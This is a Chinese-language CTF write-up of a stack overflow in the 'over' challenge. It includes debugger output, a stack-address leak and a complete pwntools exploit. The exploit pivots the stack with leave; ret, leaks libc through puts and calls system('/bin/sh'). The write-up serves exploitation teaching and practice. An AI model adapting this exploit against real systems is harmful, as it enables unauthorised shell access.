## 例子

以 2018 年 6 月安恒杯月赛的 over 一题为例进行介绍, 题目可以在 ctf-challenge 中找到

## 题目

### 文件信息

```bash
over.over: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=99beb778a74c68e4ce1477b559391e860dd0e946, stripped
[*] '/home/m4x/pwn_repo/others_over/over.over'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE
```

64 位动态链接的程序, 没有开 PIE 和 canary 保护, 但开了 
NX 保护  

### 分析程序

放到 IDA 中进行分析 

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  while ( sub_400676() )
    ;
  return 0LL;
}

int sub_400676()
{
  char buf[80]; // [rsp+0h] [rbp-50h]

  memset(buf, 0, sizeof(buf));
  putchar('>');
  read(0, buf, 96uLL);
  return puts(buf);
}
```

漏洞很明显, read 能读入 96 位, 但 buf 的长度只有 80, 因此能覆盖 rbp 以及 ret addr 但也只能覆盖到 rbp 和 ret addr, 因此也只能通过同时控制 rbp 以及 ret addr 来进行 rop 了

### leak stack

为了控制 rbp, 我们需要知道某些地址, 可以发现当输入的长度为 80 时, 由于 read 并不会给输入末尾补上 '\0', rbp 的值就会被 puts 打印出来, 这样我们就可以通过固定偏移知道栈上所有位置的地址了

```c
Breakpoint 1, 0x00000000004006b9 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────
 RAX  0x7ffceaf11160 ◂— 0x3030303030303030 ('00000000')
 RBX  0x0
 RCX  0x7ff756e9b690 (__read_nocancel+7) ◂— cmp    rax, -0xfff
 RDX  0x60
 RDI  0x7ffceaf11160 ◂— 0x3030303030303030 ('00000000')
 RSI  0x7ffceaf11160 ◂— 0x3030303030303030 ('00000000')
 R8   0x7ff75715b760 (_IO_stdfile_1_lock) ◂— 0x0
 R9   0x7ff757354700 ◂— 0x7ff757354700
 R10  0x37b
 R11  0x246
 R12  0x400580 ◂— xor    ebp, ebp
 R13  0x7ffceaf112b0 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7ffceaf111b0 —▸ 0x7ffceaf111d0 —▸ 0x400730 ◂— push   r15
 RSP  0x7ffceaf11160 ◂— 0x3030303030303030 ('00000000')
 RIP  0x4006b9 ◂— call   0x400530
─────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────
 ► 0x4006b9    call   puts@plt <0x400530>
        s: 0x7ffceaf11160 ◂— 0x3030303030303030 ('00000000')

   0x4006be    leave
   0x4006bf    ret

   0x4006c0    push   rbp
   0x4006c1    mov    rbp, rsp
   0x4006c4    sub    rsp, 0x10
   0x4006c8    mov    dword ptr [rbp - 4], edi
   0x4006cb    mov    qword ptr [rbp - 0x10], rsi
   0x4006cf    mov    rax, qword ptr [rip + 0x20098a] <0x601060>
   0x4006d6    mov    ecx, 0
   0x4006db    mov    edx, 2
─────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────
00:0000│ rax rdi rsi rsp  0x7ffceaf11160 ◂— 0x3030303030303030 ('00000000')
... ↓
───────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────
 ► f 0           4006b9
   f 1           400715
   f 2     7ff756de02b1 __libc_start_main+241
Breakpoint *0x4006B9
pwndbg> stack 15
00:0000│ rax rdi rsi rsp  0x7ffceaf11160 ◂— 0x3030303030303030 ('00000000')
... ↓
0a:0050│ rbp              0x7ffceaf111b0 —▸ 0x7ffceaf111d0 —▸ 0x400730 ◂— push   r15
0b:0058│                  0x7ffceaf111b8 —▸ 0x400715 ◂— test   eax, eax
0c:0060│                  0x7ffceaf111c0 —▸ 0x7ffceaf112b8 —▸ 0x7ffceaf133db ◂— './over.over'
0d:0068│                  0x7ffceaf111c8 ◂— 0x100000000
0e:0070│                  0x7ffceaf111d0 —▸ 0x400730 ◂— push   r15
pwndbg> distance 0x7ffceaf111d0 0x7ffceaf11160
0x7ffceaf111d0->0x7ffceaf11160 is -0x70 bytes (-0xe words)
```

leak 出栈地址后, 我们就可以通过控制 rbp 为栈上的地址(如 0x7ffceaf11160), ret addr 为 leave ret 的地址来实现控制程序流程了, 比如我们可以在 0x7ffceaf11160 + 0x8 填上 leak libc 的 rop chain 并控制其返回到 sub\_
400676 函数来 leak libc, 然后在下一次利用时就可以通过 rop 执行 system("/bin/sh") 来 get shell 了, 不过由于利用过程中栈的结构会发生变化, 所以一些关键的偏移还需要通过多次调试来确定

### exp

```python
others_over [master●●] cat solve.py 
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
context.log_level = "debug"
context.binary = "./over.over"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

def DEBUG(cmd):
    raw_input("DEBUG: ")
    gdb.attach(io, cmd)


io = process("./over.over")
#  DEBUG("b *0x4006B9\nc")
elf = ELF("./over.over")
libc = elf.libc

io.sendafter(">", '0' * 80)
stack = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\0')) - 0x70
success("stack -> {:#x}".format(stack))
'''
others_over [master●●] ropper --file ./over.over --search "leave|ret"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: leave|ret

[INFO] File: ./over.over
0x00000000004007d0: ret 0xfffe; 
0x00000000004006be: leave; ret; 
0x0000000000400509: ret; 

0x0000000000400793 : pop rdi ; ret
'''

#  DEBUG("b *0x4006B9\nc")
io.sendafter(">", flat(['11111111', 0x400793, elf.got['puts'], elf.plt['puts'], 0x400676, (80 - 40) * '1', stack, 0x4006be]))
libc.address = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\0')) - libc.sym['puts']
success("libc.address -> {:#x}".format(libc.address))

io.sendafter(">", flat(['22222222', 0x400793, next(libc.search("/bin/sh")), libc.sym['system'], (80 - 40 + 8) * '2', stack - 0x30, 0x4006be]))

io.interactive()
io.close()
```

**参考阅读**

-   [http://www.xfocus.net/articles/200602/851.html](http://www.xfocus.net/articles/200602/851.html)
-   [http://phrack.org/issues/58/4.html](http://phrack.org/issues/58/4.html)
